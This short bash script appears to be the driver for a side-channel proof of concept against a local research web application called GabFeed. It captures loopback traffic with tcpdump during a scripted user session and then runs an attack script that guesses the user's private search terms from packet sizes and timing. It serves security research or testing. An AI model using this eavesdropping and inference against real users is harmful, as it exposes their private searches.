#!/bin/bash
set -e

REBUILD=0

if [ "$#" -eq 1 ]; then
    if [ "$1" == "rebuild" ]; then
        REBUILD=1
    fi
fi


# step 1, start tcpdump
echo "Start eavesdropping on user"
/usr/sbin/tcpdump -i lo -w usertraffic.pcap tcp port 8080 > /dev/null &
TCPDUMP_PID=$!
sleep 1

# step 2, have a normal user login and perform a search unknown to attacker
echo "User does normal GabFeed activity, including several searches unknown to the attacker"
python ../../../examples/interact_gab.py 127.0.0.1 8080 johndoe BI39sdhgio2 1 1 'This is a message!' 1 'New Thread' 'New message in the new thread!' first fishermanly diabetes malaria chicken turkey dyslexia paprika > /dev/null

# step 3, stop tcpdump
sleep 1
echo "Stop eavesdropping"
kill $TCPDUMP_PID > /dev/null

export PYTHONPATH=$PYTHONPATH:../../../examples
# step 4, have the attacker build the special search term database
if [ $REBUILD -eq 1 ]; then
    echo "Start building a search -> size database"
    python ./searchattack.py 127.0.0.1 8080 build attacker buihw09H2 lo search_db.json > /dev/null
else
    echo "Skipping building of search table, if you want to rebuild it run this script as ./malicious.sh rebuild"
fi

# step 5, have the attacker guess the user's search term
echo "Find the user's search terms based on the packet sizes and times extracted from the pcap"
python ./searchattack.py 127.0.0.1 8080 find search_db.json usertraffic.pcap
